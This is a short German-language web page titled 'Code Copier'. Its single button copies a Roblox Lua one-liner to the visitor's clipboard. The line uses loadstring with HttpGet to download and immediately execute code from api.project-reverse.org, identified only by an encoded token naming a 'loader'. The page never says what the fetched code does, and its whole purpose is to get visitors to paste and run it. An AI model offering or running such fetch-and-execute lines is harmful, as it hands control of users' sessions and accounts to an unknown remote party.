<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Code Copier</title>
  <style>
    body {
      background: #111827;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px 15px;
    }
    .card {
      max-width: 600px;
      margin: auto;
      background: #1f2937;
      padding: 24px;
      border-radius: 16px;
    }
    pre {
      white-space: pre-wrap;
      overflow-wrap: anywhere;
      background: #0b1020;
      padding: 15px;
      border-radius: 10px;
      text-align: left;
    }
    button {
      background: #6366f1;
      color: white;
      border: 0;
      border-radius: 10px;
      padding: 14px 20px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>📋 Code Copier</h2>
    <p>Klicke auf den Button, um den Code zu kopieren.</p>
    <pre id="code">loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImUxNDFiMDVlLWM3MDEtNDVhNy05MjkwLTRlODU5M2UzYzY0NCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWV0cmFkZXMifX0"))()</pre>
    <button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(() => this.textContent='Kopiert!')">Code kopieren</button>
  </div>
</body>
</html>
